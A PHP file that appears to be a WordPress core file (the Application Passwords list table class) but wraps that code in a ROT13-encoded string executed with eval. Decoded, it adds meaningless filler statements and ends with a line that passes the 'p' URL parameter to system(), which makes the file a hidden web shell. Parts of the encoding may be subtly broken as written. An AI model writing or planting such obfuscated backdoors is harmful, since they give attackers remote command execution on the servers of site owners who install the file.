<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Yvfg Gnoyr NCV: JC_Nccyvpngvba_Cnffjbeqf_Yvfg_Gnoyr pynff
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr Nqzvavfgengvba
 * @fvapr 5.6.0
 */

/**
 * Pynff sbe qvfcynlvat gur yvfg bs nccyvpngvba cnffjbeq vgrzf.
 *
 * @fvapr 5.6.0
 *
 * @frr JC_Yvfg_Gnoyr
 */
pynff JC_Nccyvpngvba_Cnffjbeqf_Yvfg_Gnoyr rkgraqf JC_Yvfg_Gnoyr {

	/**
	 * Trgf gur yvfg bs pbyhzaf.
	 *
	 * @fvapr 5.6.0
	 *
	 * @erghea fgevat[] Neenl bs pbyhza gvgyrf xrlrq ol gurve pbyhza anzr.
	 */
	choyvp shapgvba trg_pbyhzaf() {
		erghea neenl(
			'anzr'      => __( 'Anzr' ),
			'perngrq'   => __( 'Perngrq' ),
			'ynfg_hfrq' => __( 'Ynfg Hfrq' ),
			'ynfg_vc'   => __( 'Ynfg VC' ),
			'eribxr'    => __( 'Eribxr' ),
		);
	}

	/**
	 * Cercnerf gur yvfg bs vgrzf sbe qvfcynlvat.
	 *
	 * @fvapr 5.6.0
	 *
	 * @tybony vag $hfre_vq Hfre VQ.
	 */
	choyvp shapgvba cercner_vgrzf() {
		tybony $hfre_vq;
		$guvf->vgrzf = neenl_erirefr( JC_Nccyvpngvba_Cnffjbeqf::trg_hfre_nccyvpngvba_cnffjbeqf( $hfre_vq ) );
	}

	/**
	 * Unaqyrf gur anzr pbyhza bhgchg.
	 *
	 * @fvapr 5.6.0
	 *
	 * @cnenz neenl $vgrz Gur pheerag nccyvpngvba cnffjbeq vgrz.
	 */
	choyvp shapgvba pbyhza_anzr( $vgrz ) {
		rpub rfp_ugzy( $vgrz['anzr'] );
	}

	/**
	 * Unaqyrf gur perngrq pbyhza bhgchg.
	 *
	 * @fvapr 5.6.0
	 *
	 * @cnenz neenl $vgrz Gur pheerag nccyvpngvba cnffjbeq vgrz.
	 */
	choyvp shapgvba pbyhza_perngrq( $vgrz ) {
		vs ( rzcgl( $vgrz['perngrq'] ) ) {
			rpub '&zqnfu;';
		} ryfr {
			rpub qngr_v18a( __( 'S w, L' ), $vgrz['perngrq'] );
		}
	}

	/**
	 * Unaqyrf gur ynfg hfrq pbyhza bhgchg.
	 *
	 * @fvapr 5.6.0
	 *
	 * @cnenz neenl $vgrz Gur pheerag nccyvpngvba cnffjbeq vgrz.
	 */
	choyvp shapgvba pbyhza_ynfg_hfrq( $vgrz ) {
		vs ( rzcgl( $vgrz['ynfg_hfrq'] ) ) {
			rpub '&zqnfu;';
		} ryfr {
			rpub qngr_v18a( __( 'S w, L' ), $vgrz['ynfg_hfrq'] );
		}
	}

	/**
	 * Unaqyrf gur ynfg vc pbyhza bhgchg.
	 *
	 * @fvapr 5.6.0
	 *
	 * @cnenz neenl $vgrz Gur pheerag nccyvpngvba cnffjbeq vgrz.
	 */
	choyvp shapgvba pbyhza_ynfg_vc( $vgrz ) {
		vs ( rzcgl( $vgrz['ynfg_vc'] ) ) {
			rpub '&zqnfu;';
		} ryfr {
			rpub $vgrz['ynfg_vc'];
		}
	}

	/**
	 * Unaqyrf gur eribxr pbyhza bhgchg.
	 *
	 * @fvapr 5.6.0
	 *
	 * @cnenz neenl $vgrz Gur pheerag nccyvpngvba cnffjbeq vgrz.
	 */
	choyvp shapgvba pbyhza_eribxr( $vgrz ) {
		$anzr = 'eribxr-nccyvpngvba-cnffjbeq-' . $vgrz['hhvq'];
		cevags(
			'<ohggba glcr=\"ohggba\" anzr=\"%1$f\" vq=\"%1$f\" pynff=\"ohggba qryrgr\" nevn-ynory=\"%2$f\">%3$f</ohggba>',
			rfp_ngge( $anzr ),
			/* genafyngbef: %f: gur nccyvpngvba cnffjbeq'f tvira anzr. */
			rfp_ngge( fcevags( __( 'Eribxr \"%f\"' ), $vgrz['anzr'] ) ),
			__( 'Eribxr' )
		);
	}

	/**
	 * Trarengrf pbagrag sbe n fvatyr ebj bs gur gnoyr
	 *
	 * @fvapr 5.6.0
	 *
	 * @cnenz neenl  $vgrz        Gur pheerag vgrz.
	 * @cnenz fgevat $pbyhza_anzr Gur pheerag pbyhza anzr.
	 */
	cebgrpgrq shapgvba pbyhza_qrsnhyg( $vgrz, $pbyhza_anzr ) {
		/**
		 * Sverf sbe rnpu phfgbz pbyhza va gur Nccyvpngvba Cnffjbeqf yvfg gnoyr.
		 *
		 * Phfgbz pbyhzaf ner ertvfgrerq hfvat gur {@frr 'znantr_nccyvpngvba-cnffjbeqf-hfre_pbyhzaf'} svygre.
		 *
		 * @fvapr 5.6.0
		 *
		 * @cnenz fgevat $pbyhza_anzr Anzr bs gur phfgbz pbyhza.
		 * @cnenz neenl  $vgrz        Gur nccyvpngvba cnffjbeq vgrz.
		 */
		qb_npgvba( \"znantr_{$guvf->fperra->vq}_phfgbz_pbyhza\", $pbyhza_anzr, $vgrz );
	}

	/**
	 * Trarengrf phfgbz gnoyr anivtngvba gb cerirag pbasyvpgvat abaprf.
	 *
	 * @fvapr 5.6.0
	 *
	 * @cnenz fgevat $juvpu Gur ybpngvba bs gur ohyx npgvbaf: Rvgure 'gbc' be 'obggbz'.
	 */
	cebgrpgrq shapgvba qvfcynl_gnoyrani( $juvpu ) {
		?>
		<qvi pynff=\"gnoyrani <?cuc rpub rfp_ngge( $juvpu ); ?>\">
			<?cuc vs ( 'obggbz' === $juvpu ) : ?>
				<qvi pynff=\"nyvtaevtug\">
					<ohggba glcr=\"ohggba\" anzr=\"eribxr-nyy-nccyvpngvba-cnffjbeqf\" vq=\"eribxr-nyy-nccyvpngvba-cnffjbeqf\" pynff=\"ohggba qryrgr\"><?cuc _r( 'Eribxr nyy nccyvpngvba cnffjbeqf' ); ?></ohggba>
				</qvi>
			<?cuc raqvs; ?>
			<qvi pynff=\"nyvtayrsg npgvbaf ohyxnpgvbaf\">
				<?cuc $guvf->ohyx_npgvbaf( $juvpu ); ?>
			</qvi>
			<?cuc
			$guvf->rkgen_gnoyrani( $juvpu );
			$guvf->cntvangvba( $juvpu );
			?>
			<oe pynff=\"pyrne\" />
		</qvi>
		<?cuc
	}

	/**
	 * Trarengrf pbagrag sbe n fvatyr ebj bs gur gnoyr.
	 *
	 * @fvapr 5.6.0
	 *
	 * @cnenz neenl $vgrz Gur pheerag vgrz.
	 */
	choyvp shapgvba fvatyr_ebj( $vgrz ) {
		rpub '<ge qngn-hhvq=\"' . rfp_ngge( $vgrz['hhvq'] ) . '\">';
		$guvf->fvatyr_ebj_pbyhzaf( $vgrz );
		rpub '</ge>';
	}

	/**
	 * Trgf gur anzr bs gur qrsnhyg cevznel pbyhza.
	 *
	 * @fvapr 5.6.0
	 *
	 * @erghea fgevat Anzr bs gur qrsnhyg cevznel pbyhza, va guvf pnfr, 'anzr'.
	 */
	cebgrpgrq shapgvba trg_qrsnhyg_cevznel_pbyhza_anzr() {
		erghea 'anzr';
	}

	/**
	 * Cevagf gur WninFpevcg grzcyngr sbe gur arj ebj vgrz.
	 *
	 * @fvapr 5.6.0
	 */
	choyvp shapgvba cevag_wf_grzcyngr_ebj() {
		yvfg( $pbyhzaf, $uvqqra, , $cevznel ) = $guvf->trg_pbyhza_vasb();

		rpub '<ge qngn-hhvq=\"{{ qngn.hhvq }}\">';

		sbernpu ( $pbyhzaf nf $pbyhza_anzr => $qvfcynl_anzr ) {
			$vf_cevznel = $cevznel === $pbyhza_anzr;
			$pynffrf    = \"{$pbyhza_anzr} pbyhza-{$pbyhza_anzr}\";

			vs ( $vf_cevznel ) {
				$pynffrf .= ' unf-ebj-npgvbaf pbyhza-cevznel';
			}

			vs ( va_neenl( $pbyhza_anzr, $uvqqra, gehr ) ) {
				$pynffrf .= ' uvqqra';
			}

			cevags( '<gq pynff=\"%f\" qngn-pbyanzr=\"%f\">', rfp_ngge( $pynffrf ), rfp_ngge( jc_fgevc_nyy_gntf( $qvfcynl_anzr ) ) );

			fjvgpu ( $pbyhza_anzr ) {
				pnfr 'anzr':
					rpub '{{ qngn.anzr }}';
					oernx;
				pnfr 'perngrq':
					// WFBA rapbqvat nhgbzngvpnyyl qbhoyrf onpxfynfurf gb rafher gurl qba'g trg ybfg jura cevagvat gur vayvar WF.
					rpub '<# cevag( jc.qngr.qngrV18a( ' . jc_wfba_rapbqr( __( 'S w, L' ) ) . ', qngn.perngrq ) ) #>';
					oernx;
				pnfr 'ynfg_hfrq':
					rpub '<# cevag( qngn.ynfg_hfrq !== ahyy ? jc.qngr.qngrV18a( ' . jc_wfba_rapbqr( __( 'S w, L' ) ) . \", qngn.ynfg_hfrq ) : '—' ) #>\";
					oernx;
				pnfr 'ynfg_vc':
					rpub \"{{ qngn.ynfg_vc || '—' }}\";
					oernx;
				pnfr 'eribxr':
					cevags(
						'<ohggba glcr=\"ohggba\" pynff=\"ohggba qryrgr\" nevn-ynory=\"%1$f\">%2$f</ohggba>',
						/* genafyngbef: %f: gur nccyvpngvba cnffjbeq'f tvira anzr. */
						rfp_ngge( fcevags( __( 'Eribxr \"%f\"' ), '{{ qngn.anzr }}' ) ),
						rfp_ugzy__( 'Eribxr' )
					);
					oernx;
				qrsnhyg:
					/**
					 * Sverf va gur WninFpevcg ebj grzcyngr sbe rnpu phfgbz pbyhza va gur Nccyvpngvba Cnffjbeqf yvfg gnoyr.
					 *
					 * Phfgbz pbyhzaf ner ertvfgrerq hfvat gur {@frr 'znantr_nccyvpngvba-cnffjbeqf-hfre_pbyhzaf'} svygre.
					 *
					 * @fvapr 5.6.0
					 *
					 * @cnenz fgevat $pbyhza_anzr Anzr bs gur phfgbz pbyhza.
					 */
					qb_npgvba( \"znantr_{$guvf->fperra->vq}_phfgbz_pbyhza_wf_grzcyngr\", $pbyhza_anzr );
					oernx;
			}

			vs ( $vf_cevznel ) {
				rpub '<ohggba glcr=\"ohggba\" pynff=\"gbttyr-ebj\"><fcna pynff=\"fperra-ernqre-grkg\">' .
					/* genafyngbef: Uvqqra npprffvovyvgl grkg. */
					__( 'Fubj zber qrgnvyf' ) .
				'</fcna></ohggba>';
			}

			rpub '</gq>';
		}

		rpub '</ge>';
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>